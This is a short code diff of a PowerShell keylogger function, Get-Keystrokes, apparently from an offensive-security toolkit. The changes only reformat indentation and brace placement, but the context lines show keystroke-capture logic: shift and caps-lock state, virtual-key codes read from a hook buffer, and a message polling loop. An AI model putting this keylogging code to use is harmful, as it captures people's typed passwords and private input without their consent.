@@ -192,7 +192,7 @@ function Get-Keystrokes {
 				if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
 				else { $Shift = $false }
 	
-		    $Caps = [Console]::CapsLock
+				$Caps = [Console]::CapsLock
 	
 				# Read virtual-key from buffer
 				$vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)
@@ -355,8 +355,7 @@ function Get-Keystrokes {
 	
 		$Stopwatch = [Diagnostics.Stopwatch]::StartNew()
 	
-		while ($true) 
-		{
+		while ($true) {
 			if ($PSBoundParameters.Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }
 			$PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
 			Start-Sleep -Milliseconds 10
